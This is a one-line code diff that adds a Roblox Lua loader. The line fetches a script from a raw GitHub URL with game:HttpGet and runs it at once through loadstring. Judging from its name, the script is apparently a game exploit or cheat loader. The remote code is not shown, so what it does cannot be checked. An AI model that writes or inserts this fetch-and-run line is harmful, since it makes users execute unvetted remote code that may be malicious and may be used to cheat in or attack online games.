@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/heisei-mothra-kaiju-alpha-spam6-mle2us7sgwbzdp.lua"))()
